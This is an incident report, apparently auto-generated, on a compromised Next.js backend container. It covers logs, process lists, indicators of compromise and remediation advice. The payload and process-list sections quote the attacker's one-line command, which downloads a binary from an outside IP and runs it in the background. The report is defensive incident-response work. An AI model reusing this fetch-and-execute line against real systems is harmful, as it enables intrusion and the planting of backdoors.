# Security Incident Report
## Container Compromise and Malicious Code Execution

**Date of Incident**: December 5, 2025  
**Time of Attack**: 10:43:10 - 10:43:13 UTC  
**Severity**: CRITICAL  
**Status**: CONTAINED (Container Restarted)

---

## Executive Summary

A malicious actor successfully compromised the `newmeet-backend` Docker container by executing arbitrary code, downloading and running a malicious binary from an external server. The attack resulted in the backend service becoming unresponsive, causing 504 Gateway Timeout errors for all users. The incident was detected and contained by restarting the container, which removed the malicious processes.

---

## Attack Details

### Attack Source
- **Attacker IP**: `45.76.155.14`
- **User Agent**: `python-requests/2.28.1` (automated script/bot)
- **Attack Method**: HTTP POST requests to root endpoint (`/`)

### Attack Timeline

1. **10:43:10 UTC** - First POST request to `/` (Status: 303 Redirect)
2. **10:43:13 UTC** - Second POST request to `/` (Status: 303 Redirect)
3. **12:25:23 UTC** - Additional POST attempts (Status: 499 Client Closed)
4. **12:25:29 UTC** - Additional POST attempts (Status: 499 Client Closed)

### Malicious Payload

The attacker executed the following command sequence inside the container:

```bash
wget http://45.76.155.14/vim -O /tmp/vim ; chmod +x /tmp/vim ; nohup /tmp/vim > /dev/null 2>&1 & wait ; rm -f /tmp/vim
```

**Components**:
- Downloaded malicious binary from `http://45.76.155.14/vim`
- Saved as `/tmp/vim` (4.7MB binary, dated Jan 15 2016 - clearly not legitimate vim)
- Made executable (`chmod +x`)
- Executed in background (`nohup`)
- Attempted cleanup (`rm -f /tmp/vim`)

### Malicious Processes Detected

When the container was examined, the following suspicious processes were found:

```
PID   USER     TIME  COMMAND
279   nextjs   0:00  /bin/sh -c wget http://45.76.155.14/vim -O /tmp/vim ; chmod +x /tmp/vim ; nohup /tmp/vim > /dev/null 2>&1 & wait ; rm -f /tmp/vim
282   nextjs   0:00  {vim} ps -ef
287   nextjs   0:10  {exe} /usr/lib/accountsservice/accounts-daemon
```

**Analysis**:
- Process 279: The command execution wrapper
- Process 282: The malicious binary masquerading as "vim"
- Process 287: Suspicious executable running as accounts-daemon (likely the persistent backdoor)

### Malicious File Details

- **Location**: `/tmp/vim`
- **Size**: 4,780,032 bytes (4.7 MB)
- **Owner**: `nextjs:nogroup`
- **Permissions**: `-rwxr-xr-x` (executable)
- **Date**: January 15, 2016 (fake timestamp)
- **Status**: Still present in `/tmp/` directory after container restart

---

## Impact Assessment

### Immediate Impact

1. **Service Disruption**:
   - Backend container became unresponsive
   - All API requests returned 504 Gateway Timeout
   - Both domains (`acadmyq.com` and `almajdmeet.org`) were affected
   - Users unable to access the application

2. **Security Compromise**:
   - Unauthorized code execution in production container
   - Potential data exfiltration (unknown extent)
   - Potential lateral movement to other containers/services
   - Backdoor installation for persistent access

3. **Data Exposure Risk**:
   - Database credentials exposed in environment variables
   - LiveKit API keys potentially compromised
   - R2 storage credentials at risk
   - JWT secrets potentially exposed

### Affected Systems

- **Container**: `newmeet-backend` (Docker container)
- **Service**: Next.js backend application
- **Domains**: `acadmyq.com`, `almajdmeet.org`
- **Database**: PostgreSQL (178.128.78.195:5433)
- **Storage**: Cloudflare R2

---

## Attack Vector Analysis

### Entry Point

The attack exploited a vulnerability that allowed command execution through HTTP POST requests to the root endpoint (`/`). 

**Possible Attack Vectors**:

1. **Command Injection in Form Processing**:
   - The root page (`app/page.tsx`) is a client-side React component
   - However, Next.js may have server-side form handling
   - POST requests returned 303 redirects, suggesting form submission handling

2. **API Route Vulnerability**:
   - Multiple POST endpoints exist in the application
   - Potential command injection in:
     - File upload endpoints (`/api/room-files/upload`)
     - Room creation endpoints
     - Admin endpoints
     - Referral registration endpoints

3. **Server-Side Rendering (SSR) Vulnerability**:
   - Next.js SSR might process POST data unsafely
   - Potential template injection or code execution

### Vulnerability Indicators

1. **No Input Validation**: The POST requests to `/` were accepted without proper validation
2. **Command Execution**: The ability to execute shell commands suggests:
   - Unsafe use of `exec()`, `spawn()`, or `system()` calls
   - Template injection vulnerabilities
   - Unsafe deserialization
3. **Missing Security Headers**: No evidence of security headers preventing code execution

---

## Evidence Collected

### Nginx Access Logs

```
45.76.155.14 - - [05/Dec/2025:10:43:10 +0000] "POST / HTTP/1.1" 303 2306 "-" "python-requests/2.28.1"
45.76.155.14 - - [05/Dec/2025:10:43:13 +0000] "POST / HTTP/1.1" 303 2305 "-" "python-requests/2.28.1"
45.76.155.14 - - [05/Dec/2025:12:25:23 +0000] "POST / HTTP/1.1" 499 0 "-" "python-requests/2.28.1"
45.76.155.14 - - [05/Dec/2025:12:25:29 +0000] "POST / HTTP/1.1" 499 0 "-" "python-requests/2.28.1"
```

### Container Process List (Before Restart)

```
PID   USER     TIME  COMMAND
279   nextjs   0:00  /bin/sh -c wget http://45.76.155.14/vim -O /tmp/vim ; chmod +x /tmp/vim ; nohup /tmp/vim > /dev/null 2>&1 & wait ; rm -f /tmp/vim
282   nextjs   0:00  {vim} ps -ef
287   nextjs   0:10  {exe} /usr/lib/accountsservice/accounts-daemon
```

### Malicious File

```
-rwxr-xr-x    1 nextjs   nogroup    4780032 Jan 15  2016 vim
```

### Network Connections

The container had normal network connections:
- Port 3000 (Next.js application)
- DNS resolver (127.0.0.11)
- No suspicious outbound connections detected at time of analysis

---

## Containment Actions Taken

1. **Container Restart**: Restarted `newmeet-backend` container at 14:39:15 UTC
2. **Process Verification**: Confirmed malicious processes were terminated
3. **Service Restoration**: Backend health check confirmed operational
4. **Malicious File**: File remains in `/tmp/` but is no longer executing

---

## Root Cause Analysis

### Primary Cause

**Command Injection Vulnerability**: The application likely has a command injection vulnerability that allows attackers to execute arbitrary shell commands through HTTP requests. This could be in:

1. **File Upload Processing**: Unsafe handling of file uploads
2. **Form Data Processing**: Unsafe parsing of POST form data
3. **API Endpoint**: Command injection in one of the POST API endpoints
4. **Server-Side Rendering**: Unsafe processing of request data in SSR

### Contributing Factors

1. **Lack of Input Sanitization**: No evidence of proper input validation/sanitization
2. **Missing Security Headers**: No security headers to prevent code execution
3. **Container Security**: Container running with potentially excessive privileges
4. **No Intrusion Detection**: No monitoring/alerting for suspicious activities
5. **Weak Access Controls**: Root endpoint accepting POST requests without authentication

---

## Recommendations

### Immediate Actions (Critical - Do Now)

1. **Remove Malicious File**:
   ```bash
   docker exec newmeet-backend rm -f /tmp/vim
   ```

2. **Rotate All Credentials**:
   - Database passwords
   - LiveKit API keys and secrets
   - JWT secrets
   - R2 storage credentials
   - All environment variables containing secrets

3. **Audit Database Access**:
   - Check for unauthorized database access
   - Review database logs for suspicious queries
   - Verify no data was exfiltrated

4. **Review Application Logs**:
   - Check Next.js application logs for the attack payload
   - Identify which endpoint was exploited
   - Determine the exact attack vector

### Short-Term Actions (High Priority - Within 24 Hours)

1. **Implement Input Validation**:
   - Add strict input validation on all POST endpoints
   - Sanitize all user inputs
   - Use parameterized queries for database operations
   - Validate file uploads strictly

2. **Add Security Headers**:
   - Implement Content Security Policy (CSP)
   - Add X-Frame-Options, X-Content-Type-Options
   - Implement rate limiting on all endpoints
   - Add request size limits

3. **Harden Container Security**:
   - Run container as non-root user (already done - `nextjs` user)
   - Implement read-only filesystem where possible
   - Remove unnecessary tools (wget, curl) from container
   - Use minimal base images

4. **Implement Intrusion Detection**:
   - Add logging for all command executions
   - Monitor for suspicious process creation
   - Alert on unexpected network connections
   - Monitor file system changes

5. **Review and Fix Vulnerable Endpoints**:
   - Audit all POST endpoints for command injection
   - Review file upload handling
   - Check form processing logic
   - Review server-side rendering code

### Medium-Term Actions (Within 1 Week)

1. **Security Audit**:
   - Conduct full security audit of the codebase
   - Use static analysis tools to find vulnerabilities
   - Perform penetration testing
   - Review all API endpoints

2. **Implement WAF (Web Application Firewall)**:
   - Deploy WAF in front of the application
   - Block known attack patterns
   - Implement rate limiting
   - Add DDoS protection

3. **Enhance Monitoring**:
   - Implement centralized logging
   - Add security event monitoring
   - Set up alerts for suspicious activities
   - Monitor container behavior

4. **Backup and Recovery**:
   - Verify backup integrity
   - Test recovery procedures
   - Implement automated backups
   - Document recovery procedures

### Long-Term Actions (Within 1 Month)

1. **Security Training**:
   - Train development team on secure coding practices
   - Review OWASP Top 10 vulnerabilities
   - Implement secure development lifecycle

2. **Regular Security Assessments**:
   - Schedule regular penetration tests
   - Conduct code reviews
   - Perform dependency audits
   - Review security configurations

3. **Incident Response Plan**:
   - Document incident response procedures
   - Create runbooks for common incidents
   - Establish communication protocols
   - Test incident response procedures

---

## Code Review Required

The following areas need immediate security review:

1. **Root Endpoint (`app/page.tsx`)**:
   - Why does it accept POST requests?
   - What happens to POST data?
   - Is there server-side form processing?

2. **File Upload Endpoints**:
   - `app/api/room-files/upload/route.ts`
   - Review file handling logic
   - Check for command injection

3. **Form Processing**:
   - All POST endpoints that accept user input
   - Form data parsing
   - Input validation

4. **Server-Side Rendering**:
   - Review SSR code for vulnerabilities
   - Check template rendering
   - Review data processing

---

## Indicators of Compromise (IOC)

1. **Malicious IP**: `45.76.155.14`
2. **Malicious URL**: `http://45.76.155.14/vim`
3. **Malicious File**: `/tmp/vim` (4.7MB binary)
4. **Suspicious Process**: `/usr/lib/accountsservice/accounts-daemon`
5. **Attack Pattern**: POST requests to `/` with `python-requests/2.28.1` user agent

---

## Prevention Measures

1. **Input Validation**: Implement strict input validation on all endpoints
2. **Command Execution Prevention**: Never execute user input as commands
3. **Principle of Least Privilege**: Run containers with minimal privileges
4. **Network Segmentation**: Isolate containers from each other
5. **Monitoring**: Implement comprehensive logging and monitoring
6. **Regular Updates**: Keep all dependencies and base images updated
7. **Security Headers**: Implement security headers to prevent attacks
8. **Rate Limiting**: Implement rate limiting on all endpoints

---

## Conclusion

This was a critical security incident that resulted in unauthorized code execution in the production environment. The attacker successfully compromised the container and installed a backdoor. While the immediate threat has been contained by restarting the container, the root cause vulnerability must be identified and fixed immediately to prevent future attacks.

**Priority Actions**:
1. Identify and fix the command injection vulnerability
2. Rotate all credentials
3. Remove malicious file
4. Implement security hardening measures
5. Enhance monitoring and alerting

---

## Report Metadata

- **Report Generated**: December 5, 2025, 14:40 UTC
- **Incident ID**: SEC-2025-12-05-001
- **Reported By**: Automated Security Analysis
- **Status**: Active Investigation Required

---

**END OF REPORT**

